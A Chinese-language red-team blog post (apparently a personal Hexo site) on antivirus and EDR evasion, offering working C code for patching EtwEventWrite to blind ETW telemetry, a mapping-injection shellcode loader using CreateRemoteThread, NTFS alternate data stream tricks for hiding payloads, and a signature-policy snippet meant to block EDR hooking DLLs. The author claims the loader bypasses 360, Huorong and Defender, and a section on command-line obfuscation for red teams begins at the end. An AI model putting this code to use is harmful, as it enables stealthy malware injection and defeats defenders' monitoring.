

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  
    <meta name="description" content="这一期也是一个杂谈，我想把一些常用的技术，无论是红队实战的，还是免杀的一些技巧都写一下，因为还是不成体系没办法单独写成一个模块。所以写起来比较杂，兄弟们也不要嫌弃，该有的简单介绍和代码也是有的。 后续的计划是准备写二进制和翻译一些国外的文章，还有杂谈一些过去出现的一些有意思的新技术，比如doublue agent，这种2017年就出来的利用Windows 的机制实现被动dll注入的技术。当然现在面">
<meta property="og:type" content="article">
<meta property="og:title" content="《ETW绕过、Shellcode游击与NTFS备用数据流杂谈：高级规避技术漫谈》">
<meta property="og:url" content="http://example.com/2025/10/07/%E3%80%8AETW%E7%BB%95%E8%BF%87%E3%80%81Shellcode%E6%B8%B8%E5%87%BB%E4%B8%8ENTFS%E5%A4%87%E7%94%A8%E6%95%B0%E6%8D%AE%E6%B5%81%E6%9D%82%E8%B0%88%EF%BC%9A%E9%AB%98%E7%BA%A7%E8%A7%84%E9%81%BF%E6%8A%80%E6%9C%AF%E6%BC%AB%E8%B0%88%E3%80%8B/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="这一期也是一个杂谈，我想把一些常用的技术，无论是红队实战的，还是免杀的一些技巧都写一下，因为还是不成体系没办法单独写成一个模块。所以写起来比较杂，兄弟们也不要嫌弃，该有的简单介绍和代码也是有的。 后续的计划是准备写二进制和翻译一些国外的文章，还有杂谈一些过去出现的一些有意思的新技术，比如doublue agent，这种2017年就出来的利用Windows 的机制实现被动dll注入的技术。当然现在面">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071430753.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071434643.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071438966.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071440329.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071445049.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071448241.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071530830.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071534166.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071604471.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071608669.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071609114.png">
<meta property="article:published_time" content="2025-10-07T06:20:44.000Z">
<meta property="article:modified_time" content="2025-10-07T08:31:52.126Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="杂谈">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071430753.png">
  
  
  
  <title>《ETW绕过、Shellcode游击与NTFS备用数据流杂谈：高级规避技术漫谈》 - Hexo</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>yawataa</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>Home</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>Archives</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>Categories</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>Tags</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>About</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>Links</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/sun.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="《ETW绕过、Shellcode游击与NTFS备用数据流杂谈：高级规避技术漫谈》"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-10-07 14:20" pubdate>
          October 7, 2025 pm
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          4.9k words
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          41 mins
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">《ETW绕过、Shellcode游击与NTFS备用数据流杂谈：高级规避技术漫谈》</h1>
            
            
              <div class="markdown-body">
                
                <p>这一期也是一个杂谈，我想把一些常用的技术，无论是红队实战的，还是免杀的一些技巧都写一下，因为还是不成体系没办法单独写成一个模块。所以写起来比较杂，兄弟们也不要嫌弃，该有的简单介绍和代码也是有的。</p>
<p>后续的计划是准备写二进制和翻译一些国外的文章，还有杂谈一些过去出现的一些有意思的新技术，比如doublue agent，这种2017年就出来的利用Windows 的机制实现被动dll注入的技术。当然现在面对杀软和EDR这些技术可能很难起效，但是技术的研究和内核依然值得我们学习。</p>
<p>大概后面的文章就分为这几类  windows机制(写一些操作系统机制)    二进制研究   国外文章翻译   免杀分享（有时间就写免杀，然后把加载器发出来）  高星项目分析(目前设想是分析土豆家族和impact 套件那些)</p>
<p>至于攻防实战，应急响应，等后面有有趣的项目案例再分享吧。好的废话不多说，我们进入今天的内容。</p>
<h1 id="ETW绕过"><a href="#ETW绕过" class="headerlink" title="ETW绕过"></a>ETW绕过</h1><h2 id="简单引入"><a href="#简单引入" class="headerlink" title="简单引入"></a>简单引入</h2><p>在红队测试工具 <a target="_blank" rel="noopener" href="https://鳄鳄www.cobaltstrike.com鳄/">Cobalt Strike</a> 有个功能，叫做 <a target="_blank" rel="noopener" href="https://www.cobaltstrike.com/aggressor-script/functions.html#bexecute_assembly">bexecute_assembly</a>，能够从内存中加载.NET程序集。这个功能不需要向硬盘写入文件，十分隐蔽，而且现有的Powershell利用脚本能够很容易的转换为C#代码，十分方便。简单来说就是它会在 Process 中执行 .NET Assemblies。原理是通过系统提供的API（ ICLRMetaHost<a target="_blank" rel="noopener" href="https://www.21ct.cc/">、</a>ICLRRuntimeInfo、ICLRRuntimeHost） 达到将 CLR 载入的效果。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071430753.png" srcset="/img/loading.gif" lazyload alt="image-20251007143046649"></p>
<p>托管模块：Managed Module，一个标准的MS Window可移植执行体文件(32位PE32或64位PE32+)<br>        IL：Intermediate Language 中间语言，又叫托管代码(由CLR管理它的执行)<br>        元数据：metadata，一系列特殊的数据表<br>        程序集：Assembly，抽象的<br>        JIT：just-in-time 即时编译，将IL编译成本地CPU指令(本地代码)<br>        FCL：Framework Class Library，Framework 类库<br>        CTS：Common Type System，通用类型系统，描述了类型的定义及其行为方式<br>        CLI：Common Language Infrastructure，公共语言基础结构，这是MS提交给ECMA的一个标准，由CTS和其他Framwork组件构成  (CTS、CLS、 CR)<br>        CLS：Common Language Specfication，公共语言规范，详细规定了一个最小特性集</p>
<h2 id="CLR"><a href="#CLR" class="headerlink" title=".CLR"></a><strong>.CLR</strong></h2><p>全称Common Language Runtime（公共语言运行库），是一个可由多种编程语言使用的运行环境。</p>
<p><a target="_blank" rel="noopener" href="http://clr是.net/">CLR是.NET</a> Framework的主要执行引擎，来管理执行中的 .NET 程序：</p>
<p><strong>·</strong> 在CLR监视之下运行的程序属于”托管的”(managed)代码。</p>
<p><strong>·</strong> 不在CLR之下、直接在裸机上运行的应用或者组件属于”非托管的”(unmanaged)的代码</p>
<p>简单的说来这个技术是为了提高兼容性的，有点java中的jvm像虚拟机，CLR 引入了 <strong>CIL (Common Intermediate Language)<strong>，也叫 MSIL (Microsoft Intermediate Language)。无论你用 C#、VB.NET 还是 F# 编写代码，最终都会被编译成这种统一的中间语言。CLR 能够理解并执行 CIL，从而实现了</strong>语言的互操作性</strong>。这意味着不同 .NET 语言编写的组件可以无缝地相互调用。</p>
<p>就是你无论使用 C#还是VB.NET这些写代码，他不会直接编译成机器码，而是编译成一种中间语言，然后交给CLR这个平台进行翻译，等他翻译成机器码再交给cpu进行执行，这也就是我为什么说有点像java中的虚拟机了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071434643.png" srcset="/img/loading.gif" lazyload alt="image-20251007143440598"></p>
<p>.NET Assemblies 是有办法被侦测到的，在 Process Explorer 中显示的 .NET Assemblies 就放着这个Process 所使用的 .NET Assemblies资源。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071438966.png" srcset="/img/loading.gif" lazyload alt="image-20251007143851918"></p>
<p>还或者是使用这个命令</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">logman</span> query providers &#123;E13C0D23-CCBC-<span class="hljs-number">4</span>E12-<span class="hljs-number">931</span>B-D9CC2EEE27E4&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071440329.png" srcset="/img/loading.gif" lazyload alt="image-20251007144016274"></p>
<p>而CRL的一切动静也是会被ETW识别到，我们也很简单的就能绕过,因为核心就是EtwEventWrite这个api，程序启动后就会调用EtwEventWrite这个api向ETW中写入事件，我们只需要hook一下，将第一个写入的数据改成0xc3返回指令，就会终止这个写入了</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Tlhelp32.h&gt;</span></span><br><span class="hljs-type">int</span> main() &#123;<br>	STARTUPINFOA si = &#123; <span class="hljs-number">0</span> &#125;;<br>	PROCESS_INFORMATION pi = &#123; <span class="hljs-number">0</span> &#125;;<br>	si.cb = <span class="hljs-keyword">sizeof</span>(si);<br><br>	<span class="hljs-comment">// 1. 建立一个 Powershell Process，并取得 Process Handle</span><br>	CreateProcessA(<span class="hljs-literal">NULL</span>, (LPSTR)<span class="hljs-string">&quot;powershell -noexit&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, CREATE_SUSPENDED, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi);<br><br>	<span class="hljs-comment">// 2. 从 ntdll.dll 中取得 EtwEventWrite 的地址</span><br>	HMODULE hNtdll = GetModuleHandleA(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br>	LPVOID pEtwEventWrite = GetProcAddress(hNtdll, <span class="hljs-string">&quot;EtwEventWrite&quot;</span>);<br><br>	<span class="hljs-comment">// 3. 把 EtwEventWrite 的地址的权限改成可读、可写、可执行(rwx)</span><br>	DWORD oldProtect;<br>	VirtualProtectEx(pi.hProcess, (LPVOID)pEtwEventWrite, <span class="hljs-number">1</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);<br><br>	<span class="hljs-comment">// 4. 将 EtwEventWrite 的第一个 byte 改成 0xc3，也就是ret返回指令</span><br>	<span class="hljs-type">char</span> patch = <span class="hljs-number">0xc3</span>;<br>	WriteProcessMemory(pi.hProcess, (LPVOID)pEtwEventWrite, &amp;patch, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>), <span class="hljs-literal">NULL</span>);<br><br>	<span class="hljs-comment">// 5. 把 EtwEventWrite 的权限改回，并且继续执行 Process</span><br>	VirtualProtectEx(pi.hProcess, (LPVOID)pEtwEventWrite, <span class="hljs-number">1</span>, oldProtect, <span class="hljs-literal">NULL</span>);<br>	ResumeThread(pi.hThread);<br><br>	CloseHandle(pi.hProcess);<br>	CloseHandle(pi.hThread);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071445049.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="映射注入"><a href="#映射注入" class="headerlink" title="映射注入"></a>映射注入</h1><h2 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>映射注入是一种内存注入技术，可以避免使用一些经典注入技术使用的API,如VirtualAllocEx,WriteProcessMemory等被杀毒软件严密监控的API，同时创建Mapping对象本质上属于申请一块物理内存，而申请的物理内存又能比较方便的通过系统函数直接映射到进程的虚拟内存里，这也就避免使用经典写入函数，增加了隐蔽性。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071448241.png" srcset="/img/loading.gif" lazyload></p>
<p>基本原理其实就是利用的Windows映射内存的那几个api，我之前测试过免杀性很好，我对编译器基本没有做什么出来，shellcode也只用了sgn加密，写出来加载器，直接过360 火绒和defender 。微步0查杀，vt 6&#x2F;55 当然肯定还是没过哨兵一号</p>
<h2 id="简单实现"><a href="#简单实现" class="headerlink" title="简单实现"></a>简单实现</h2><ol>
<li>在注入进程创建mapping</li>
<li>将mapping映射到注入进程虚拟地址</li>
<li>往被映射的虚拟地址写入shellcode</li>
<li>打开被注入进程句柄</li>
<li>将mapping映射到被注入进程虚拟地址</li>
<li>创建远程线程</li>
</ol>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (lib, <span class="hljs-string">&quot;OneCore.lib&quot;</span>)</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-type">int</span> main(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)<br>&#123;<br><br><br>	<span class="hljs-comment">//创建文件映射内核对象</span><br>	HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, <span class="hljs-literal">NULL</span>, PAGE_EXECUTE_READWRITE, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(shellcode), <span class="hljs-literal">NULL</span>);<br><br>	<span class="hljs-comment">//文件映射对象映射到当前应用程序的地址空间</span><br>	LPVOID lpMapAddress = MapViewOfFile(hMapping, FILE_MAP_WRITE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(shellcode));<br><br>	memcpy((PVOID)lpMapAddress, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));<br><br>	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, <span class="hljs-literal">FALSE</span>, atoi(argv[<span class="hljs-number">1</span>]));<br><br>	<span class="hljs-comment">//映射到指定进程的地址空间</span><br>	LPVOID lpMapAddressRemote = MapViewOfFile2(hMapping, hProcess, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, PAGE_EXECUTE_READ);<br><br>	HANDLE hRemoteThread = CreateRemoteThread(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)lpMapAddressRemote, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><br>	UnmapViewOfFile(lpMapAddress);<br>	CloseHandle(hMapping);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071530830.png" srcset="/img/loading.gif" lazyload alt="image-20251007153007724"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071534166.png" srcset="/img/loading.gif" lazyload alt="image-20251007153414050"></p>
<p>这个api比较新，在win10之后才有的。</p>
<h1 id="NTFS备用数据流"><a href="#NTFS备用数据流" class="headerlink" title="NTFS备用数据流"></a>NTFS备用数据流</h1><p>这个就比较熟悉了，在web安全里面，有NTFS流绕过文件上传的手法</p>
<h2 id="简单介绍-1"><a href="#简单介绍-1" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>1993年微软推出了基于流行的NT平台的Windows NT操作系统。之后，NTFS作为WIndows开发基于NT的操作系统时的首选文件系统，逐步取代被应用于旧版Windows操作系统（比如Windows 9x）的文件系统，即FAT（File Access Table）。</p>
<p>  NTFS中的备用数据流（Alternate Data Stream，ADS）允许将一些元数据嵌入文件或是目录，而不需要修改其原始功能或内容。</p>
<p>  在NTFS中，主数据流指的是文件或目录的标准内容，通常对用户可见，而备用数据流（ADS）则隐藏。如果要查看备用数据流，可以使用<code>dir</code>命令的<code>/R</code>选项，或是Windows提供的<code>streams.exe</code>工具，没有可用的API。</p>
<p>简单来说就是在 NTFS 中，文件具有属性。其中一个属性是“数据”属性。数据属性通常包含文件的内容。例如，如果你有一个文本文件，数据属性将包含该文件的内容。通常不为人所知的是，此属性分为两部分。第一部分是所谓的主数据流，它包含文件的内容。第二部分通常称为备用流。像主数据流一样，备用流可以包含数据。</p>
<p>ADS没有大小限制且多个数据流可以和一个正常文件关联。ADS的内容也不仅限于text文本数据，基本上只要是二进制格式文件都可以被作为ADS备用流嵌入。所以我们可以将 base64 编码二进制文件存储在 NTFS 备用流中，然后执行它。还可以修改与备用流关联的文件的创建和修改日期，使其更难以被检测到。</p>
<h3 id="已知的一个正常用途"><a href="#已知的一个正常用途" class="headerlink" title="已知的一个正常用途"></a>已知的一个正常用途</h3><p>在windows上，从网上下载的文件，都会有一个备用数据流，名为：<filename>:Zone.Identifier<br>该备用数据流会记录下载地址，这个功能也被系统用于判断文件是否从网络下载</p>
<p>假如下载的文件是 hello.txt，则备用数据流名称为：hello.txt:Zone.Identifier<br>意思就是说，假如我发现hello.txt:Zone.Identifier存在，那同一文件夹下的hello.txt就是从网上下载的</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-built_in">Item</span> <span class="hljs-variable">c</span><span class="hljs-operator">:</span>\<span class="hljs-variable">temp</span> <span class="hljs-operator">-</span><span class="hljs-variable">Stream</span> <span class="hljs-operator">*</span><br><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">Content</span> <span class="hljs-variable">tempt</span> <span class="hljs-operator">-</span><span class="hljs-variable">Stream</span> <span class="hljs-variable">evil</span><br></code></pre></td></tr></table></figure>





<p>具体利用可以看这</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/654643812">Windows之 NTFS 交换数据流 实现隐藏文件 - 知乎</a></p>
<h1 id="利用系统策略防止dll注入"><a href="#利用系统策略防止dll注入" class="headerlink" title="利用系统策略防止dll注入"></a>利用系统策略防止dll注入</h1><h2 id="简单介绍-2"><a href="#简单介绍-2" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>可以通过 Windows 阻止非 Microsoft 签名的二进制文件注入该进程的方式启动新进程。这对于规避一些通过将 DLL 注入正在运行的进程来执行用户级挂钩的 AV&#x2F;EDR很有用。</p>
<h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-type">int</span> main()<br>&#123;<br>	PROCESS_INFORMATION pi = &#123;&#125;;<br>	STARTUPINFOEXA si = &#123;&#125;;<br>	SIZE_T attributeSize = <span class="hljs-number">0</span>;<br>	<br>	InitializeProcThreadAttributeList(<span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, &amp;attributeSize);<br>	PPROC_THREAD_ATTRIBUTE_LIST attributes = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attributeSize);<br>	InitializeProcThreadAttributeList(attributes, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, &amp;attributeSize);<br><br>	DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;<br>	UpdateProcThreadAttribute(attributes, <span class="hljs-number">0</span>, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &amp;policy, <span class="hljs-keyword">sizeof</span>(DWORD64), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>	si.lpAttributeList = attributes;<br><br>	CreateProcessA(<span class="hljs-literal">NULL</span>, (LPSTR)<span class="hljs-string">&quot;notepad&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">TRUE</span>, EXTENDED_STARTUPINFO_PRESENT, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si.StartupInfo, &amp;pi);<br>	HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, attributes);<br><br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>





<p>重要的其实就是这两句，大家把这几句加到自己程序里面就可以了</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY <span class="hljs-built_in">sp</span> = &#123;&#125;;<br><span class="hljs-built_in">sp</span>.MicrosoftSignedOnly = <span class="hljs-number">1</span>;<br>SetProcessMitigationPolicy(ProcessSignaturePolicy, &amp;<span class="hljs-built_in">sp</span>, sizeof(<span class="hljs-built_in">sp</span>));<br></code></pre></td></tr></table></figure>





<p>其实就是Windows的一个策略，将程序标志设置成ProcessSignaturePolicy这个，就只能运行带有微软签名的dll加载。大概可以和之前的dll空心化打一个配合？</p>
<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071604471.png" srcset="/img/loading.gif" lazyload alt="image-20251007160442380"></p>
<h1 id="命令行混淆"><a href="#命令行混淆" class="headerlink" title="命令行混淆"></a>命令行混淆</h1><h2 id="简单介绍-3"><a href="#简单介绍-3" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>对于红队来说，会希望蓝队分析的成本提高，让自己的指令或代码比较不容易被理解或是侦测。假设蓝队要辨别现在要执行的指令是不是恶意的，可能会透过指令的一些特征确认，那红队就可以利用混淆的方式绕过那些特征。</p>
